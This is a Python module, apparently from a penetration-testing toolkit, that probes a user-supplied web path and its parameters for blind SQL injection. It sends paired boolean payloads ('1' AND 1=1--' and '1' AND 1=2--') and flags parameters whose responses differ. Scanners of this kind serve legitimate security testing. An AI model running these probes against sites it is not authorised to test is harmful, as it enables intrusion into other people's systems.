import requests
from rich.console import Console
from rich.prompt import Prompt
from .utils import console
from .constants import DEFAULT_PARAMS

def run_blind_sqli(base_url):
    console.print("[bold cyan]--- Blind SQL Injection Tester ---[/bold cyan]")

    directory = Prompt.ask("[?] Directory to test for Blind SQLi")
    url_base = f"{base_url.rstrip('/')}/{directory.strip('/')}"

    param_list = Prompt.ask("[?] Parameter names (comma-separated) or press enter for default", default="").split(",")
    param_list = [p.strip() for p in param_list if p.strip()] or DEFAULT_PARAMS

    found_any = False
    for param in param_list:
        true_payload = f"{url_base}?{param}=1' AND 1=1--"
        false_payload = f"{url_base}?{param}=1' AND 1=2--"

        try:
            true_res = requests.get(true_payload, timeout=10)
            false_res = requests.get(false_payload, timeout=10)
        except requests.RequestException as e:
            console.print(f"[-] Error testing {param}: {e}", style="bold red")
            continue

        if true_res.status_code == 200 and false_res.status_code == 200:
            if true_res.text != false_res.text:
                console.print(f"[bold green][+] Blind SQL Injection possible on parameter: {param}[/bold green]")
                found_any = True

    if not found_any:
        console.print("[bold red][-] No Blind SQLi detected on tested parameters.[/bold red]")
